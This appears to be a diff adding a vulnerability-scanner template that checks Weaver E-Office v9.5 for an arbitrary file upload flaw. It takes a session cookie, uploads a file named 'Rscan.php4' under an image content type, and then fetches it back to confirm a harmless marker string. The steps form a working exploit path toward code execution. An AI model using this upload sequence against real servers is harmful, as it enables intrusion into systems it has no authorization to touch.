@@ -1,0 +1,32 @@
+name: 泛微-EOffice-v9.5-upload_save-文件上传
+description: >
+  任意文件上传
+alwaysExecute: false
+matchCount: 4
+rules:
+  - method: GET
+    path: /sample.php
+    search: >-
+      PHPSESSID=(?P<cookie>[^;]+)
+    expression:
+      status: 200    
+  - method: POST
+    path: /inc/ext/upload/file-upload.php
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryc3kzQm4dBRhin8Dk
+      Cookie: PHPSESSID={{cookie}};
+    body: "------WebKitFormBoundaryc3kzQm4dBRhin8Dk\r\nContent-Disposition: form-data; name=\"userfile\"; filename=\"Rscan.php4\"\r\nContent-Type: image/jpeg\r\n\r\nRscan_test\r\n------WebKitFormBoundaryc3kzQm4dBRhin8Dk--"
+    expression:
+      status: 200
+  - method: GET
+    path: /general/address/view/get-images.php?alb_id=11&start=0&limit=1
+    search: '\\/attachment\\/album\\/(?P<album_id>\d+)\\/'
+    headers:
+      Cookie: PHPSESSID={{cookie}};
+    expression:
+      status: 200
+  - method: GET
+    path: /attachment/album/{{album_id}}/Rscan.php4
+    expression:
+      status: 200
+      body_all: ["Rscan_test"]      
